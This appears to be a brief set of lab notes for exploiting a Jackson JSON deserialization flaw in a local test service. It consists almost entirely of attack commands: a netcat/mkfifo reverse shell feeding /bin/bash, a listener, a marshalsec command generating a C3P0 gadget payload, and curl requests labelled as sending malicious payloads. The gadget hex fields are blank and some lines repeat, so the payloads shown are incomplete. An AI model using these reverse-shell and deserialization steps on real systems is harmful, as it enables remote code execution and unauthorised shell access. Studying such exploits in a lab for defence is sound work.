Command to create a netcat BASH client
```bash
rm pi1 && mkfifo pi1 && nc -n 127.0.0.1 8200 < pi1 | /bin/bash > pi1
```

Command to create a netcat server
```bash
nc -vnl 8200
```

Sample deserialization payloads to understand the process
```bash
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\"}"
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":\"EggSpam\"}"
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":[\"EggSpam\"]}"
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":[\"EggSpam\", {\"Leo\": \"Major\"}]}"
```

To generate malicious payload:
```bash
java -cp exploit/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson C3P0WrapperConnPool http://127.0.0.1:8080/ InnocentClass
```

Sending malicious payload
```bash
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", {\"userOverridesAsString\": \"HexAsciiSerializedMap:;\"}]}"
```

Sending other malicious payload
```bash
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", {\"userOverridesAsString\": \"HexAsciiSerializedMap:;\"}]}"
curl -X POST localhost:8888 --data "{\"name\":\"FooBar\", \"body\":[\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", {\"userOverridesAsString\": \"HexAsciiSerializedMap:;\"}]}"
```

An example of serialized gadget class object
```
HexAsciiSerializedMap:;
```
